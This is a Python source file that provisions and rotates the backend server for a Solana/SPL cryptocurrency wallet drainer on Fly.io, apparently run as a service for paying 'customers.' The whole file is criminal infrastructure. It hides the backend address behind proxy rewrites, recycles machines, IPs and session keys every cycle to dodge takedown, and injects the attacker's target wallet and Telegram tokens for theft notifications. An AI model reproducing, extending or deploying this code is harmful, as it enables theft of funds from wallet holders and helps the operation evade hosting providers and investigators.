# core/drainer_backend.py — The sol+spl drainer backend as a stable Fly app
#
# The backend gets ONE stable app (hostname chimera-drainer.fly.dev) whose
# machine is recycled every rotation cycle: hostname persists (customer
# frontends never break), machine ID / private IP / session key rotate.
#
# Customer payloads call same-origin API paths; their Vercel rewrites proxy
# to this hostname. The backend address never appears in client code.
#
# Image: registry.fly.io/chimera-drainer:latest
# Build+push from the sol+spl repo: cd server && fly auth docker &&
#   docker build -t registry.fly.io/chimera-drainer:latest . && docker push ...

import logging
import secrets
from typing import Any, Dict, Optional

import requests

from core.fly_provisioner import FlyProvisioner


class DrainerBackend:
    """Manage the stable drainer-backend Fly app."""

    APP_NAME = "chimera-drainer"
    IMAGE = "registry.fly.io/chimera-drainer:latest"
    PORT = 3000  # sol+spl server.js listens on PORT (default 3000)

    def __init__(self, provisioner: FlyProvisioner, backend_env: Optional[Dict[str, str]] = None):
        """
        backend_env: secrets injected into the machine — AES_SECRET,
        TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, RPC_ENDPOINT (+ fallback
        TARGET_WALLET / CHECK_WALLET). Pulled from config.yaml.
        """
        self.fly = provisioner
        self.backend_env = backend_env or {}

    # ------------------------------------------------------------------
    # App lifecycle
    # ------------------------------------------------------------------

    def _ensure_app(self) -> None:
        """Create the stable app if it doesn't exist yet (idempotent)."""
        # Check existence first — an app-scoped token can't pass the create
        # call, but it CAN see and manage the existing app.
        resp = requests.get(
            f"{self.fly.BASE}/apps/{self.APP_NAME}",
            headers=self.fly.headers,
        )
        if resp.ok:
            return

        resp = requests.post(
            f"{self.fly.BASE}/apps",
            headers=self.fly.headers,
            json={"app_name": self.APP_NAME, "org_slug": self.fly.org},
        )
        if resp.ok:
            logging.info(f"[drainer] created stable app {self.APP_NAME}")
            return
        # "already exists" style errors are fine — anything else is fatal
        if "exist" in resp.text.lower() or "taken" in resp.text.lower() or resp.status_code == 409:
            return
        raise RuntimeError(
            f"Fly API: failed to create app '{self.APP_NAME}': {resp.status_code} {resp.text}"
        )

    def _list_machines(self) -> list[Dict[str, Any]]:
        resp = requests.get(
            f"{self.fly.BASE}/apps/{self.APP_NAME}/machines",
            headers=self.fly.headers,
        )
        if not resp.ok:
            return []
        return resp.json() or []

    def _destroy_machines(self) -> None:
        for m in self._list_machines():
            vm_id = m.get("id")
            if not vm_id:
                continue
            logging.info(f"[drainer] destroying old machine {vm_id}...")
            requests.delete(
                f"{self.fly.BASE}/apps/{self.APP_NAME}/machines/{vm_id}",
                headers=self.fly.headers,
                params={"force": "true"},
            )

    # ------------------------------------------------------------------
    # Rotation entry point
    # ------------------------------------------------------------------

    def recycle(self, valid_chat_ids: Optional[list[str]] = None) -> Dict[str, Any]:
        """Recycle the backend machine: fresh machine ID, IP, session —
        same app, same hostname. Called once per rotation cycle.

        valid_chat_ids: current customer chat ids — injected as
        VALID_CHAT_IDS so the backend only delivers customer
        notifications to registered chats (anti-spoof)."""
        self._ensure_app()
        self._destroy_machines()

        session_key = secrets.token_hex(16)
        vm_env: Dict[str, str] = {
            "SESSION_KEY": session_key,
            "LISTEN_PORT": str(self.PORT),
            "PORT": str(self.PORT),
        }
        vm_env.update(self.backend_env)
        if valid_chat_ids:
            vm_env["VALID_CHAT_IDS"] = ",".join(str(c) for c in valid_chat_ids)

        # External 443 — "tls" handler terminates TLS at Fly edge, then http
        machine_config: Dict[str, Any] = {
            "region": self.fly.region,
            "config": {
                "image": self.IMAGE,
                "auto_destroy": False,
                "env": vm_env,
                "guest": {"cpu_kind": "shared", "cpus": 1, "memory_mb": 512},
                "services": [
                    {
                        "internal_port": self.PORT,
                        "protocol": "tcp",
                        "ports": [{"port": 443, "handlers": ["tls", "http"]}],
                    }
                ],
            },
        }

        resp = requests.post(
            f"{self.fly.BASE}/apps/{self.APP_NAME}/machines",
            headers=self.fly.headers,
            json=machine_config,
        )
        if not resp.ok:
            raise RuntimeError(
                f"Fly API: failed to create machine for '{self.APP_NAME}': "
                f"{resp.status_code} {resp.text}"
            )
        machine = resp.json()
        vm_id = machine["id"]

        self.fly._wait_for_state(self.APP_NAME, vm_id, "started", timeout=180)

        self._ensure_shared_ipv4()

        logging.info(f"[drainer] backend live: https://{self.APP_NAME}.fly.dev (machine {vm_id[:8]}...)")

        return {
            "app_name": self.APP_NAME,
            "vm_id": vm_id,
            "hostname": f"{self.APP_NAME}.fly.dev",
            "internal_port": self.PORT,
            "session_key": session_key,
            "image": self.IMAGE,
        }

    def health_url(self) -> str:
        return f"https://{self.APP_NAME}.fly.dev/health"

    def _ensure_shared_ipv4(self) -> None:
        """Allocate a shared IPv4 for the app if it has none (idempotent —
        the allocation persists per app across machine recycles)."""
        # Does it already have any v4?
        q = 'query { app(name:"%s") { ipAddresses { nodes { address type } } } }' % self.APP_NAME
        resp = requests.post(
            "https://api.fly.io/graphql",
            headers=self.fly.headers,
            json={"query": q},
        )
        existing = (
            resp.json().get("data", {}).get("app", {}).get("ipAddresses", {}).get("nodes", [])
        ) if resp.ok else []
        if any(str(n.get("type")) == "ipv4" for n in existing):
            return

        m = (
            'mutation { allocateIPAddress(input: '
            '{appId: "%s", type: ipv4, shared: true}) { ip { address } } }' % self.APP_NAME
        )
        resp = requests.post(
            "https://api.fly.io/graphql",
            headers=self.fly.headers,
            json={"query": m},
        )
        if not resp.ok:
            logging.warning(f"[drainer] shared IPv4 allocation failed: {resp.text[:200]}")
